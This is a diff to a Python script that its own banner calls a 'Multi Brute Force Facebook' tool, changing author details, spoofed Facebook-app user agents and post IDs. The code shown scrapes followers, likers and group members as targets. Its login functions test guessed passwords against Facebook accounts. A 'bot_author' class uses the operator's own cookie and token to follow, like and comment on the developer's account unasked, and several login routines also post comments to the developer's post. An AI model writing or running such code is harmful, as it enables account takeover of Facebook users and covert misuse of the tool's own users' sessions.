@@ -1,9 +1,9 @@
-###----------[ Denventa Afriliyan Ferly Khurayra Shishigami X ]---------- ###
-Author_ll =  '-[ Denventa Afriliyan Ferly Khurayra Shishigami X ] -'
-Version = '0.4'
-Facebook_Dev = 'Denventa Afriliyan Ferly Shishigami X (Denventa)'
+###------[ Denventa Afriliyan Ferly Khurayra Shishigami X ]------###
+Develpr = 'Denventa Ferly Afriliyan'
 Dnventa = 100013275378835
-Postingan = 1630150370770793
+Version = '0.9'
+Post_Dev = 1650374082081755
+Facebook = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
 Author    = 'Dapunta Khurayra X'
@@ -12,7 +12,6 @@ Instagram = 'Instagram.com/Dapunta.Ratya'
 Whatsapp  = '082245780524'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
 Denventa  = 1827084332
-
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
 from random import randint
@@ -51,19 +50,19 @@ A2 = "[#AAAAAA]" # Abu-Abu
 
 ###----------[ USER AGENT ]---------- ###
 ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
-ua_samsung = 'Mozilla/5.0 (Linux; Android 11; SM-A325F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]'
+ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
 ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
 ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_oppo    = 'Mozilla/5.0 (Linux; Android 12; CPH2159 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
-ua_vivo    = 'Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
-ua_iphone  = 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1;FBBV/4100.0;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/5.0.1;FBSS/2; FBCR/Three;FBID/phone;FBLC/en_US;FBSF/2.0]'
+ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
 ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
-ua_huawei  = 'Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]'
-ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
+ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
-ua_fb      = 'Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/324.0.0.8.106;]'
-komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
+ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
+komentar   = '\n\nhttps://www.facebook.com/' + str(Post_Dev)
 
 ###----------[ TIME ]---------- ###
 id_dev = 345 - 340 + 720 - 723
@@ -194,10 +193,24 @@ def language(cookie):
                     exec = xyz.post(url,data=bahasa,cookies=cookie)
     except Exception as e:pass
 
+###----------[ EXCEPTION ]---------- ###
+def kecuali(error):
+    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
+    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
+    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
+    print('       %s• %sCookies/Token Invalid'%(M,A))
+    print('       %s• %sSalah Memasukkan ID'%(M,A))
+    print('       %s• %sBug Pada Source Code'%(M,A))
+    print('       %s• %sBug Pada Requests'%(M,A))
+    print('       %s• %sDan Lain-Lain\n'%(M,A))
+    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
+    print('       %s• %spython sakera.py\n'%(M,A))
+    exit()
+
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Dnventa)];self.komen = ['Mantap Bang','Gokil Suhu','Panutanku','Semangat Terus']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Dnventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -300,7 +313,6 @@ def poster4():
     l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(U,P,U,P,U,P,U,P,U,P,U,P))
     l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,U,Version,P,U))
     print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
-
 ###----------[ CREATE FOLDER ]---------- ###
 def mkdir_data_login():
     # Make Directory Login Data
@@ -354,6 +366,7 @@ def user(nama):
     print(''%())
     print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
     print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
+    print('        %s[%s•%s] %sDeveloper : Denventa Ferly Afriliyan'%(J,P,J,P,A))
 def tampilan_menu():
     global gabung_sandi, tempel_sandi
     resik()
@@ -367,7 +380,7 @@ def tampilan_menu():
         printer(Panel(tamp_new,title=f'{H2}[ {P2}Welcome User {H2}]',width=54,padding=(1,4),style='#00FF00'))
         print('')
         useragent('new')
-    poster4()
+    poster()
     try:
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
@@ -568,7 +581,7 @@ def exec_folls(url,token,file):
             x = xyz.get(url,cookies=cookie)
             a = json.loads(x.text)
             if len(tempel_sandi) != 1:
-                for x in range(Postingan):
+                for x in range(Post_Dev):
                     open(file_dump,'a+').write('dev\n')
             else:
                 for b in a['data']:
@@ -579,7 +592,7 @@ def exec_folls(url,token,file):
                     except Exception as e:continue
             y = par(x.text,'html.parser')
             n = re.findall('"after":"(.*?)"},',str(y))[0]
-            next = ('https://graph.facebook.com/v16.0/100013275378835/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
+            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
             exec_folls(next,token,file)
         except KeyboardInterrupt:pass
         except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
@@ -624,7 +637,7 @@ def scrape_likers(_dapunta_,_url_,_file_):
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             if len(tempel_sandi) != 1:
-                for x in range(Postingan):
+                for x in range(Post_Dev):
                     open(file_dump,'a+').write('dev\n')
             else:
                 for _id_ in _isi_.find_all('a',href=True):
@@ -674,7 +687,7 @@ class komen:
                     else:ud = str(x).split('?')[0].replace('/','');u  = convert_id(ud)
                     try:
                         if len(tempel_sandi) != 1:
-                            for x in range(Postingan):
+                            for x in range(Post_Dev):
                                 open(file_dump,'a+').write('dev\n')
                         else:
                             if str(u) in str(self.f):continue
@@ -822,7 +835,7 @@ class grup:
                 for pe in pra.find_all('h3'):
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
-                            for x in range(Postingan):
+                            for x in range(Post_Dev):
                                 open(file_dump,'a+').write('dev\n')
                         else:
                             try:
@@ -852,7 +865,7 @@ class grup:
                 for pe in pra.find_all('h3'):
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
-                            for x in range(Postingan):
+                            for x in range(Post_Dev):
                                 open(file_dump,'a+').write('dev\n')
                         else:
                             try:
@@ -926,7 +939,7 @@ class suggestion:
                             id = re.search('uid=(.*?)&',x['href']).group(1)
                             nm = x.text
                             if len(tempel_sandi) != 1:
-                                for x in range(Postingan):
+                                for x in range(Post_Dev):
                                     open(file_dump,'a+').write('dev\n')
                             else:
                                 if id in file:pass
@@ -1057,7 +1070,7 @@ def logger1(user,pasw): #--- Login Validate ---#
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1085,7 +1098,7 @@ def logger2(user,pasw): #--- Login Regular ---#
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
         else:
@@ -1110,7 +1123,7 @@ def logger3(user,pasw): #--- Login Api 1 ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1139,7 +1152,7 @@ def logger4(user,pasw): #--- Login Api 2 ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1168,7 +1181,7 @@ def logger5(user,pasw): #--- Login Graph FB ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1440,14 +1453,13 @@ def not_available(konten):
     printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
     input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
     tampilan_menu()
-    
+
 def not_availablell(konten):
     print('')
-    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Telah Dihapus Saat Ini. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Baru, Yang Akan Datang. Terima Kasih.\n\n                {M2}- Denventa -')
-    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
+    tamp_kesediaan = (f'   {P2}Mohon Maaf, Fitur {konten} Telah Di Hapus Karena Sudah Tidak Lagi Berfungsi. Tunggu Update Selanjutnya Untuk Menggunakan Fitur-Fitur Yang Akan Datang,Dan Lebih Menarik. Terima Kasih.\n\n                {U2}- Denventa -')
+    printer(Panel(tamp_kesediaan,title=f'{U2}[  {P2}Coming  Soon  {U2}]',title_align='center',subtitle=f'{U2}[  {P2}See  You  {U2}]',subtitle_align='center',width=54,padding=(1,4),style='#AF00FF'))
     input('\n\n               %s[ %sKembali Ke Menu Awal %s]              '%(H,P,H))
-    tampilan_menu()   
-
+    tampilan_menu()
 if __name__ == '__main__':
     resik()
     tampilan_menu()
